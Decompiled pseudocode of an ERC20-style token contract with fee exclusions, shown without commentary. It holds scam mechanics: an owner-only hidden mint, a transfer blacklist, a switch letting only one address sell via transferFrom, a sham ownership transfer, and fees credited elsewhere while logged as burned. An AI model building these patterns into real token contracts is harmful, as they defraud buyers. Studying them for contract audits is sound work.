contract main {




// =====================  Runtime code  =====================


address owner;
address stor1;
address deadAddress;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor5;
mapping of uint8 stor6;
uint256 totalSupply;
uint256 totalFees;
array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 sub_a14c80fb;
mapping of uint8 stor13;
uint8 stor14;
uint8 stor14; offset 8
uint256 stor14; offset 8
uint256 sub_62292c80;
mapping of uint256 stor16;
array of address stor17;
address stor18;

function name() payable {
    return name[0 len name.length]
}

function isExcludedFromRewards(address arg1) payable {
    require calldata.size - 4 >= 32
    return bool(stor6[address(arg1)])
}

function totalFees() payable {
    return totalFees
}

function totalSupply() payable {
    return totalSupply
}

function deadAddress() payable {
    return deadAddress
}

function decimals() payable {
    return decimals
}

function sub_468c9079(?) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    return bool(stor13[address(arg1)])
}

function sub_62292c80(?) payable {
    return sub_62292c80
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function sub_a14c80fb(?) payable {
    return sub_a14c80fb
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function sub_2343438d(?) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor13[address(arg1)] = 1
}

function sub_5b7b3485(?) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor13[address(arg1)] = 0
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    owner = arg1
}

function includeInFee(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor5[address(arg1)] = 0
}

function excludeFromFee(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor5[address(arg1)] = 1
}

function sub_0c2f0edb(?) payable {
    require calldata.size - 4 >= 32
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    Mask(248, 0, stor14.field_8) = Mask(248, 0, arg1)
}

function sub_b6471dbb(?) payable {
    require calldata.size - 4 >= 64
    if stor1 != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if arg2 <= 0:
        revert with 0, 'mhdwch'
    if not stor16[address(arg1)]:
        stor17.length++
        stor17[stor17.length] = arg1
    if stor16[address(arg1)] + arg2 < stor16[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    stor16[address(arg1)] += arg2
    if sub_62292c80 + arg2 < sub_62292c80:
        revert with 0, 'SafeMath: addition overflow'
    sub_62292c80 += arg2
    if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
        revert with 0, 'SafeMath: addition overflow'
    balanceOf[address(arg1)] += arg2
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if stor5[address(msg.sender)]:
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        if arg2 <= 0:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        41,
                        0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                        mem[205 len 23]
        if uint8(stor14.field_0):
            if stor13[address(msg.sender)]:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                            mem[205 len 23]
        if not msg.sender:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        if arg2 > balanceOf[address(msg.sender)]:
            revert with 0, 'SafeMath: subtraction overflow'
        balanceOf[address(msg.sender)] -= arg2
        if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if stor5[address(arg1)]:
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg2 <= 0:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                            mem[205 len 23]
            if uint8(stor14.field_0):
                if stor13[address(msg.sender)]:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                41,
                                0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                                mem[205 len 23]
            if not msg.sender:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg2 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if not arg2:
                if not msg.sender:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
                if not deadAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[269 len 23]
            require arg2
            if arg2 * sub_a14c80fb / arg2 != sub_a14c80fb:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not msg.sender:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
            if not deadAddress:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
            if arg2 * sub_a14c80fb / 100 <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[269 len 23]
            if uint8(stor14.field_0):
                if stor13[address(msg.sender)]:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[269 len 23]
            if not msg.sender:
                revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
            if not deadAddress:
                revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
            if arg2 * sub_a14c80fb / 100 > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] -= arg2 * sub_a14c80fb / 100
            if balanceOf[stor2] + (arg2 * sub_a14c80fb / 100) < balanceOf[stor2]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor2] += arg2 * sub_a14c80fb / 100
            emit Transfer((arg2 * sub_a14c80fb / 100), msg.sender, deadAddress);
            if arg2 * sub_a14c80fb / 100 > arg2:
                revert with 0, 'SafeMath: subtraction overflow'
            if not msg.sender:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
            if not arg1:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
            if arg2 - (arg2 * sub_a14c80fb / 100) <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            if uint8(stor14.field_0):
                if stor13[address(msg.sender)]:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            if not msg.sender:
                revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
            if not arg1:
                revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
            if arg2 - (arg2 * sub_a14c80fb / 100) > balanceOf[address(msg.sender)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(msg.sender)] = balanceOf[address(msg.sender)] - arg2 + (arg2 * sub_a14c80fb / 100)
            if balanceOf[address(arg1)] + arg2 - (arg2 * sub_a14c80fb / 100) < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * sub_a14c80fb / 100)
            emit Transfer((arg2 - (arg2 * sub_a14c80fb / 100)), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    if uint8(stor14.field_8):
        if stor18 != arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        41,
                        0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                        mem[205 len 23]
    if stor5[address(msg.sender)]:
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        if arg3 <= 0:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        41,
                        0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                        mem[205 len 23]
        if uint8(stor14.field_0):
            if stor13[address(arg1)]:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                            mem[205 len 23]
        if not arg1:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        37,
                        0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                        mem[201 len 27]
        if not arg2:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        35,
                        0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                        mem[199 len 29]
        if arg3 > balanceOf[address(arg1)]:
            revert with 0, 'SafeMath: subtraction overflow'
        balanceOf[address(arg1)] -= arg3
        if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
    else:
        if stor5[address(arg2)]:
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg3 <= 0:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            41,
                            0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                            mem[205 len 23]
            if uint8(stor14.field_0):
                if stor13[address(arg1)]:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                41,
                                0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572,
                                mem[205 len 23]
            if not arg1:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            37,
                            0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                            mem[201 len 27]
            if not arg2:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            35,
                            0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                            mem[199 len 29]
            if arg3 > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
        else:
            if not arg3:
                if not arg1:
                    revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
                if not deadAddress:
                    revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[269 len 23]
            require arg3
            if arg3 * sub_a14c80fb / arg3 != sub_a14c80fb:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x73536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if not arg1:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
            if not deadAddress:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
            if arg3 * sub_a14c80fb / 100 <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[269 len 23]
            if uint8(stor14.field_0):
                if stor13[address(arg1)]:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[269 len 23]
            if not arg1:
                revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[265 len 27]
            if not deadAddress:
                revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[263 len 29]
            if arg3 * sub_a14c80fb / 100 > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] -= arg3 * sub_a14c80fb / 100
            if balanceOf[stor2] + (arg3 * sub_a14c80fb / 100) < balanceOf[stor2]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor2] += arg3 * sub_a14c80fb / 100
            emit Transfer((arg3 * sub_a14c80fb / 100), arg1, deadAddress);
            if arg3 * sub_a14c80fb / 100 > arg3:
                revert with 0, 'SafeMath: subtraction overflow'
            if not arg1:
                revert with 0, 32, 37, 0x7345524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
            if not arg2:
                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
            if arg3 - (arg3 * sub_a14c80fb / 100) <= 0:
                revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            if uint8(stor14.field_0):
                if stor13[address(arg1)]:
                    revert with 0, 32, 41, 0x655472616e7366657220616d6f756e74206d7573742062652067726561746572207468616e207a6572, mem[397 len 23]
            if not arg1:
                revert with 0, 32, 37, 0x7342455032303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[393 len 27]
            if not arg2:
                revert with 0, 32, 35, 0x6f42455032303a207472616e7366657220746f20746865207a65726f20616464726573, mem[391 len 29]
            if arg3 - (arg3 * sub_a14c80fb / 100) > balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: subtraction overflow'
            balanceOf[address(arg1)] = balanceOf[address(arg1)] - arg3 + (arg3 * sub_a14c80fb / 100)
            if balanceOf[address(arg2)] + arg3 - (arg3 * sub_a14c80fb / 100) < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * sub_a14c80fb / 100)
            emit Transfer((arg3 - (arg3 * sub_a14c80fb / 100)), arg1, arg2);
            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                revert with 0, 
                            32,
                            40,
                            0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                            mem[424 len 24],
                            mem[472 len 8]
            if not arg1:
                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[552 len 28]
            if not msg.sender:
                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[550 len 30]
            allowance[address(arg1)][address(msg.sender)] -= arg3
            emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
